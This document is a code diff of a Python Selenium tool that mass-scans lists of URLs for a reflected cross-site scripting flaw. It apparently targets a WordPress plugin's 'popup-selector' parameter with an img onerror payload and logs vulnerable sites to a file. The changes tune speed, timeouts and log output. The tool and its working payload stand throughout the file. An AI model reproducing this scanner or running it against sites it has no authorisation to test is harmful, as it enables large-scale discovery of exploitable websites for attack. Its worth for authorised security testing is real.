@@ -13,16 +13,22 @@ from selenium.webdriver.common.alert import Alert
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException, NoAlertPresentException, WebDriverException
-# By Chirag Artani
+
 # Lock for thread-safe file writing
 file_lock = threading.Lock()
 # Counter for statistics
 stats = {
     'vulnerable': 0,
     'errors': 0,
+    'timeouts': 0,
     'processed': 0
 }
 stats_lock = threading.Lock()
+
+# Suppress excessive DevTools output
+import logging
+from selenium.webdriver.remote.remote_connection import LOGGER
+LOGGER.setLevel(logging.WARNING)
 
 def is_valid_url(url):
     """Check if the URL is valid and has a scheme"""
@@ -57,34 +63,44 @@ def check_xss(url):
     chrome_options.add_argument("--disable-dev-shm-usage")
     chrome_options.add_argument("--ignore-certificate-errors")
     chrome_options.add_argument("--ignore-ssl-errors")
+    chrome_options.add_argument("--log-level=3")  # Suppress console messages
+    chrome_options.add_argument("--silent")
+    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
     
     # Create payload URL
     payload_url = f"{url}/?popup-selector=%3Cimg_src=x_onerror=alert(%22chirgart%22)%3E&eael-lostpassword=1"
     
     # Initialize the WebDriver with webdriver-manager
     try:
-        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
-        driver.set_page_load_timeout(10)  # 10 seconds timeout for page load
+        service = Service(ChromeDriverManager().install())  # Fixed: removed log_level parameter
+        driver = webdriver.Chrome(service=service, options=chrome_options)
+        driver.set_page_load_timeout(8)  # Reduced timeout for faster scanning
     except Exception as e:
-        print(f"[ERROR] Failed to initialize WebDriver: {e}")
+        print(f"[ERROR] Failed to initialize WebDriver: {str(e).split('\n')[0]}")
         return False
     
     try:
-        print(f"Testing URL: {payload_url}")
+        print(f"Testing URL: {url}")
         
         # Navigate to the page
         try:
             driver.get(payload_url)
+        except TimeoutException:
+            with stats_lock:
+                stats['timeouts'] += 1
+            print(f"[TIMEOUT] Page load timed out: {url}")
+            return False
         except Exception as e:
-            print(f"[ERROR] Failed to load page: {e}")
+            error_msg = str(e).split('\n')[0]  # Get only the first line of the error
+            print(f"[ERROR] Failed to load page: {error_msg}")
             return False
         
         # Wait for a few seconds for any JavaScript to execute
-        time.sleep(2)
+        time.sleep(1.5)  # Reduced wait time
         
         # Check if an alert is present
         try:
-            WebDriverWait(driver, 3).until(EC.alert_is_present())
+            WebDriverWait(driver, 2).until(EC.alert_is_present())  # Reduced wait time
             alert = driver.switch_to.alert
             alert_text = alert.text
             alert.accept()
@@ -106,10 +122,12 @@ def check_xss(url):
             return True
             
     except WebDriverException as e:
-        print(f"[ERROR] WebDriver error: {e}")
+        error_msg = str(e).split('\n')[0]
+        print(f"[ERROR] WebDriver error: {error_msg}")
         return False
     except Exception as e:
-        print(f"[ERROR] Unexpected error: {e}")
+        error_msg = str(e).split('\n')[0]
+        print(f"[ERROR] Unexpected error: {error_msg}")
         return False
     finally:
         # Clean up
@@ -155,13 +173,15 @@ def worker(url_queue, total_urls):
                     with stats_lock:
                         stats['vulnerable'] += 1
             except Exception as e:
-                print(f"[ERROR] Failed to test {url}: {e}")
+                error_msg = str(e).split('\n')[0]
+                print(f"[ERROR] Failed to test {url}: {error_msg}")
                 with stats_lock:
                     stats['errors'] += 1
         except queue.Empty:
             break
         except Exception as e:
-            print(f"Worker error: {e}")
+            error_msg = str(e).split('\n')[0]
+            print(f"Worker error: {error_msg}")
         finally:
             url_queue.task_done()
 
@@ -228,7 +248,7 @@ if __name__ == "__main__":
                             eta_sec = int(eta_seconds % 60)
                             eta_str = f" - ETA: {eta_min}m {eta_sec}s"
                         
-                        print(f"Progress: {completed}/{total_urls} ({(completed/total_urls*100):.1f}%) - Vulnerable: {stats['vulnerable']} - Errors: {stats['errors']}{eta_str}")
+                        print(f"Progress: {completed}/{total_urls} ({(completed/total_urls*100):.1f}%) - Vulnerable: {stats['vulnerable']} - Errors: {stats['errors']} - Timeouts: {stats['timeouts']}{eta_str}")
                     
                     time.sleep(5)  # Update every 5 seconds
                 
@@ -244,10 +264,11 @@ if __name__ == "__main__":
             
             print(f"\nCompleted testing {stats['processed']}/{total_urls} URLs in {minutes}m {seconds}s")
             print(f"Found {stats['vulnerable']} vulnerable sites (saved to found-vuln-fully.txt)")
-            print(f"Encountered errors on {stats['errors']} sites")
+            print(f"Encountered {stats['errors']} errors and {stats['timeouts']} timeouts")
             
         except Exception as e:
-            print(f"Error processing file: {e}")
+            error_msg = str(e).split('\n')[0]
+            print(f"Error processing file: {error_msg}")
     else:
         # Process single URL
         url = input_arg
